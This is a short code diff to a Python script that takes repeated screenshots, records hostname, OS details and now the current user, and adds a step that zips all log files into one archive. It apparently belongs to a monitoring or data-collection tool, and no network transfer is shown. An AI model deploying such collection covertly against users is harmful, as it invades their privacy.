@@ -30,6 +30,7 @@ from PIL import ImageGrab
 from datetime import datetime
 
 import sys
+from zipfile import ZipFile
 
 # OS information fetch
 
@@ -112,6 +113,7 @@ while current_iteration < no_of_iterations:
     sys_details.update({'system_info' : platform.system()})
     sys_details.update({'uname' : platform.uname()})
     sys_details.update({'hostname' : socket.gethostname()})
+    sys_details.update({'current_user' : current_user})
 
     # print(sys_details.items())
 
@@ -157,6 +159,17 @@ while current_iteration < no_of_iterations:
     take_screenshot(screenshot_information_end)
 
     current_iteration += 1
+
+# Creating zipfile of all log files
+
+all_files = os.listdir(logpath)
+zipfile_name = logpath + 'Zipped_logs_' + str(datetime.now()) + '.zip'
+
+with ZipFile(zipfile_name, 'w') as zipobj:
+    for file in all_files:
+        full_path = logpath + file
+        zipobj.write(full_path)
+
 
 sys.exit()
 
